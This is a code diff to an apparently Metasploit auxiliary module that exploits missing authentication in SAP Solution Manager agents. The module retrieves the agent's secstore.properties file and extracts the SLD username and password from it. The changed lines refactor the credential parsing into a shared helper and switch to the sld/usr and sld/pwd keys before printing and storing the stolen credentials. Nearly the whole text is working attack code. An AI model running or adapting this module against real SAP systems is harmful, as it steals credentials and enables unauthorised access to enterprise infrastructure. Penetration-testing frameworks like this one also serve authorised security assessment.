@@ -8,6 +8,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpServer
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::Remote::HTTP::SapSolManEemMissAuth
+  include Msf::Exploit::Local::SapSmdAgentUnencryptedProperty
 
   def initialize(info = {})
     super(
@@ -130,38 +131,24 @@ class MetasploitModule < Msf::Auxiliary
     print_good("Successfully retrieved file #{secstore_filename} from agent: #{@agent_name} saved in: #{loot}")
 
     # Analyze secstore.properties file
-    rows = secstore_content.split(/\n+/)
-    rows.each do |row|
-      property = row.match(/(?<name>[^\\]+)=(?<value>.*)/)
-      next if property.nil?
-
-      string_type = ''
-      string_len = '0'
-      string_val = ''
-
-      # BASE64 decode properties smd/agent/User and smd/agent/Password
-      if (property[:name] == 'smd/agent/User') || (property[:name] == 'smd/agent/Password')
-        string_type, string_len, string_val = Rex::Text.decode_base64(property[:value].sub('\\=', '=')).split(/\|/)
-      end
-      next unless (string_len.to_i > 0) && (string_type.to_s == 'java.lang.String')
-
-      # Check properties smd/agent/User and smd/agent/Password is decoded
+    properties = parse_properties(secstore_content)
+    properties.each do |property|
       case property[:name]
-      when 'smd/agent/User'
-        @username = string_val.first(string_len.to_i)
-      when 'smd/agent/Password'
-        @password = string_val.first(string_len.to_i)
+      when 'sld/usr'
+        @username = property[:value]
+      when 'sld/pwd'
+        @password = property[:value]
       end
     end
 
     # Store decoded credentials and report vulnerability
-    if @username.nil? && @password.nil?
+    if @username.nil? || @password.nil?
       fail_with(Failure::NotVulnerable, "The agent: #{@agent_name} sent a secstore.properties file, but this file is likely encrypted or does not contain credentials. The agent: #{@agent_name} is likely patched.")
     else
       # Store decoded credentials
       print_good("Successfully encoded credentials for SolMan server: #{@host}:#{@port} from agent: #{@agent_name} - #{agent_host}")
-      print_good("Username: #{@username}")
-      print_good("Password: #{@password}")
+      print_good("SLD username: #{@username}")
+      print_good("SLD password: #{@password}")
       store_valid_credential(
         user: @username,
         private: @password,
